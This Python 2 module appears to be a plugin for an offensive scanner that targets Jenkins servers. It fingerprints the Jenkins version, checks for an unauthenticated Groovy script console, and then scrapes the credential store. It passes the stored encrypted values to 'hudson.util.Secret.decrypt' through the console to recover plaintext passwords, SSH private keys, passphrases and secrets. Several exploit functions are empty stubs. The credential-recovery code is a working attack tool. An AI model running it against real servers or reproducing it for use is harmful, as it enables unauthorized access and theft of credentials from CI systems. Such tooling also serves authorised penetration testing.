# -*- coding: utf-8 -*-

import requests
import jenkins
import urllib3
from bs4 import BeautifulSoup
import re

DEFAULT_PORTS = [80, 8080, 443, 8000, 8081]
DEFAULT_PATHS = ['/', '/jenkins']
TARGET_NAME   = 'Jenkins'


def fingerprint(res):
    if res.status_code == 403:
        if res.headers.get('x-hudson') or res.headers.get('x-jenkins') or \
                        'window.location.replace(\'/login?from=' in res.text:
            if res.headers.get('x-jenkins'):
                version = res.headers.get('x-jenkins')
            else:
                version = 'unknown'
            return { 'use_security': True, 'version': version }
    if res.status_code == 200 and '<title>Dashboard [Jenkins]</title>' in res.text:
        match = re.search(r'Jenkins ver\. ([\d\.]+)', res.text)
        if match:
            version = match.group(1)
        elif res.headers.get('x-jenkins'):
            version = res.headers.get('x-jenkins')
        else:
            version = 'unknown'
        return { 'use_security': False, 'version': version }
    return None

def check_script_console(target):
    if target['url'].endswith('/'):
        script_url = target['url'] + 'script'
    else:
        script_url = target['url'] + '/script'
    try:
        res = requests.get(script_url)
        if res.status_code == 200 and \
                '<title>Jenkins</title>' in res.text and 'Script Console' in res.text:
            return { 'script_console': True }
    except requests.exceptions.RequestException as e:
        print 'Error: ' + str(e)
    except urllib3.exceptions.LocationParseError as e:
        print 'Error: ' + str(e)
    return {}

def check_cli_rmi_deserialization(target):
    pass

def check_new_job(target):
    pass

def script_interface(url, script):
    with requests.Session() as s:
        res = s.get(url + 'script')
        headers = {'content-type': 'application/x-www-form-urlencoded'}
        match = re.search(r'crumb\.init\("Jenkins-Crumb", "([0-9a-f]+)"\)', res.text)
        if match:
            csrf_token = match.group(1)
            data = {
                'script': script,
                'Jenkins-Crumb': csrf_token,
                'Submit': 'Run'
            }
        else:
            data = {
                'script': script,
                'Submit': 'Run'
            }

        res = s.post(url + 'script', headers=headers, data=data)
        soup = BeautifulSoup(res.text, 'html.parser')
        return soup.body.findAll('pre')[1].text.replace('Result: ', '')

def credential_recovery(target):
    creds = {}
    if 'script_console' in target['vulns'] and target['vulns']['script_console']:
        if target['url'].endswith('/'):
            url = target['url']
        else:
            url = target['url'] + '/'
        cred_store_url = ''
        cred_store_urls = [
            'credential-store/domain/_/',
            'credentials/store/system/domain/_/'
        ]
        for u in cred_store_urls:
            res = requests.get(url + u)
            if res.status_code == 200:
                cred_store_url = u
        if not cred_store_url:
            print 'Could not locate credential store URL'
            return creds

        soup = BeautifulSoup(res.text, 'html.parser')

        credentials = []
        for link in soup.body.findAll('a', href=True):
            if link['href'].startswith('credential/'):
                credential = link['href'].split('/')[1]
                if credential not in credentials:
                    credentials.append(credential)

        for credential in credentials:
            res = requests.get(url + cred_store_url + 'credential/' + credential + '/update')
            if res.status_code != 200:
                continue
            soup = BeautifulSoup(res.text, 'html.parser')

            if re.search(r'_\.username', res.text) and re.search(r'_\.password', res.text):
                username = soup.body.findAll(attrs={'name': '_.username'})[0]['value']
                e_pass = soup.body.findAll(attrs={'name': '_.password'})[0]['value']
                
                script = 'hudson.util.Secret.decrypt \'%s\'' % e_pass
                password = script_interface(url, script).strip()

                creds.update({credential: {'type': 'password', 'username': username, 'password': password}})

            elif re.search(r'_\.passphrase', res.text) and re.search(r'_\.privateKey', res.text):
                e_passphrase = soup.body.findAll(attrs={'name': '_.passphrase'})[0]['value'].strip()
                private_key = soup.body.findAll(attrs={'name': '_.privateKey'})[0].contents[0].strip()

                script = 'hudson.util.Secret.decrypt \'%s\'' % e_passphrase
                passphrase = script_interface(url, script)

                creds.update({credential: {'type': 'private_key', 'key': private_key, 'passphrase': passphrase}})

            elif re.search(r'_\.secret', res.text):
                e_secret = soup.body.findAll(attrs={'name': '_.secret'})[0]['value'].strip()
                script = 'hudson.util.Secret.decrypt \'%s\'' % e_secret
                secret = script_interface(url, script)

                creds.update({credential: {'type': 'secret', 'secret': secret}})

    return creds

def assess(target):
    target['vulns'] = {}
    target['vulns'].update(check_script_console(target))
    #target['vulns'].update(check_cli_rmi_deserialization(target))
    #target['vulns'].update(check_new_job(target))
    target['creds'] = {}
    target['creds'].update(credential_recovery(target))
    return target

def exploit(target):
    pass
